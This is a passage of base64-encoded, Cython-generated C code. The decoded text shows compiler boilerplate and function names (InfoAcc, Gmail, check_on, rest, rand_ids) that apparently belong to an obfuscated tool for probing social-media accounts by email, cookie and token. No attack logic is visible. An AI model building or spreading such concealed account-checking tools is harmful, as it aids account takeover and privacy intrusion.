0ZSkge1xuICBQeU9iamVjdCogdHVwbGVfZGVkdXBfbWFwID0gUHlEaWN0X05ldygpO1xuICBpZiAodW5saWtlbHkoIXR1cGxlX2RlZHVwX21hcCkpIHJldHVybiAtMTtcbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCAxMTMsIDJ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2l9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9rX3EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMF0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDExNCwgMn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fb3BfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfcSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgMTE1LCAyfTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsyXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9vcF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19fMTgsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDQwNiwgMn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfXzE5fTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9vcF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa18xXzIsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAzLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgOTMsIDkzfTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9iLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ibywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb3V0cHV0fTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls0XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9vcF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHBwcCwgX19weXhfa19oYXNfZ1Fpcl9zX0FfYl9BX0FfQV9BX3dmQVFfd2ZBLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMTcsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxMTEsIDMzOX07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbjEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X24yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ob3N0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZTMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JlczEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3RvaywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3RsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9vcF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGxsLCBfX3B5eF9rX1J1Q3FfUnVDcV9yX2NfYV9xX0FfQV9RY194dDFfQSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDUsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxNjQsIDE5N307XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3J9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzZdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXN0LCBfX3B5eF9rXzFfYV9RXzFfMV9BXzFfcV9hX0FfcV9BX2FfYV9hX2IsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNl0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMTk5LCAxNjl9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91aWR9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRlLCBfX3B5eF9rX2NfMlJ2UV8xX1NfYV8xX2NfcV8xX3NfMV9zXzFfNiwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls3XSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezIsIDAsIDAsIDE2LCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMjI4LCAzNzV9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcnIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mdWxsX25hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Zvd3MsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Zvd2csIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BwLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pc1ByYWlzZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYmlvLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pc192ZXJpZmllZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYml6eiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbWV0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc3MsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2ZpbGUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzhdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF9rX2F6XzRxX2FfYV9BXzJUX0FfMlRfUV80cV9xX3JfUW4sIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAxMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDI4MywgMzY1fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hvc3QsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BhcmFtcywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X29rLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2d9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9HbWFpbCwgX19weXhfa180c19DcV9mQVRfQVp0NV9ScV9BWnQ1X1JxX0cxRl8xLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDMzOCwgNjZ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3ZhbHVlfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fb3BfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Zvcm1hdF9udW1iZXIsIF9fcHl4X2tfRV92U19yX1YyUV9zX3JfVjJRXzNhc18xLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEwXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDgsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAzNDcsIDE5N307XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZW1haWwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kZXYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RldmljZV9pZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXVpLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jaGVja19vbiwgX19weXhfa19BX0JnVF9RZF83X1pyXzFfUWRfYV9hYWdnaF9BX0EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM4NSwgNTF9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2JiaywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfSWRvLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZH07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yYW5kX2lkcywgX19weXhfa19BVl9RZTFfc183XzFfcV9hLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEyXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDE3LCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMzk0LCA4MTN9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2RvbWFpbiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYmJrLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZG8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JuZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF8yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbHNkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb3dzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwcn07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTNdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91dXUsIF9fcHl4X2tfUV9jX2FfQl9BWnpZZWVvb3lfel9DX0NfRF9EX0pfSiwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxM10pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNDQ3LCA1Nn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdH07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTRdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX29wX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcmludGluZywgX19weXhfa19VXzFfSVdBV0FfcV93YXFfUV9hLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE0XSkpIGdvdG8gYmFkO1xuICB9XG4gIFB5X0RFQ1JFRih0dXBsZV9kZWR1cF9tYXApO1xuICByZXR1cm4gMDtcbiAgYmFkOlxuICBQeV9ERUNSRUYodHVwbGVfZGVkdXBfbWFwKTtcbiAgcmV0dXJuIC0xO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfSW5pdEdsb2JhbHModm9pZCkge1xuICBcbiAgaWYgKGxpa2VseShfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcygpID09IDApKTsgZWxzZVxuXG5pZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbntcbiAgICBQeU9iamVjdCAqdHlwZXNNb2R1bGU9TlVMTDtcbiAgICB0eXBlc01vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgidHlwZXMiKTtcbiAgICBpZiAodHlwZXNNb2R1bGUpIHtcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcodHlwZXNNb2R1bGUsICJNZXRob2RUeXBlIik7XG4gICAgICAgIFB5X0RFQ1JFRih0eXBlc01vZHVsZSk7XG4gICAgfVxufSAvLyBlcnJvciBoYW5kbGluZyBmb2xsb3dzXG4jZW5kaWZcblxuaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG5cbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgcmV0dXJuIC0xO1xufVxuXG5cblxuXG4jaWZkZWYgX01TQ19WRVJcbiNwcmFnbWEgd2FybmluZyggcHVzaCApXG5cbiNwcmFnbWEgd2FybmluZyggZGlzYWJsZSA6IDQxMjcgKVxuI2VuZGlmXG5cblxuXG5cblxuXG5cbiNpZiBDWVRIT05fUkVGTkFOTllcbnN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSkge1xuICAgIFB5T2JqZWN0ICptID0gTlVMTCwgKnAgPSBOVUxMO1xuICAgIHZvaWQgKnIgPSBOVUxMO1xuICAgIG0gPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUobW9kbmFtZSk7XG4gICAgaWYgKCFtKSBnb3RvIGVuZDtcbiAgICBwID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhtLCAiUmVmTmFubnlBUEkiKTtcbiAgICBpZiAoIXApIGdvdG8gZW5kO1xuICAgIHIgPSBQeUxvbmdfQXNWb2lkUHRyKHApO1xuZW5kOlxuICAgIFB5X1hERUNSRUYocCk7XG4gICAgUHlfWERFQ1JFRihtKTtcbiAgICByZXR1cm4gKF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICopcjtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKFB5T2JqZWN0ICpleGNfdHlwZSwgUHlPYmplY3QgKnR1cGxlKSB7XG4gICAgUHlfc3NpemVfdCBpLCBuO1xuICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTtcbiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHtcbiAgICAgICAgaWYgKGV4Y190eXBlID09IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSByZXR1cm4gMTtcbiAgICB9XG4gICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7XG4gICAgICAgIGlmIChfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSkgcmV0dXJuIDE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNJblN0YXRlKFB5VGhyZWFkU3RhdGUqIHRzdGF0ZSwgUHlPYmplY3QqIGVycikge1xuICAgIGludCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKmV4Y190eXBlO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICBQeU9iamVjdCAqY3VycmVudF9leGNlcHRpb24gPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIGlmICh1bmxpa2VseSghY3VycmVudF9leGNlcHRpb24pKSByZXR1cm4gMDtcbiAgICBleGNfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoY3VycmVudF9leGNlcHRpb24pO1xuICAgIGlmIChleGNfdHlwZSA9PSBlcnIpIHJldHVybiAxO1xuI2Vsc2VcbiAgICBleGNfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7XG4gICAgaWYgKGV4Y190eXBlID09IGVycikgcmV0dXJuIDE7XG4gICAgaWYgKHVubGlrZWx5KCFleGNfdHlwZSkpIHJldHVybiAwO1xuI2VuZGlmXG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfSU5DUkVGKGV4Y190eXBlKTtcbiAgICAjZW5kaWZcbiAgICBpZiAodW5saWtlbHkoUHlUdXBsZV9DaGVjayhlcnIpKSkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXhjX3R5cGUsIGVycik7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBlcnIpO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9ERUNSRUYoZXhjX3R5cGUpO1xuICAgICNlbmRpZlx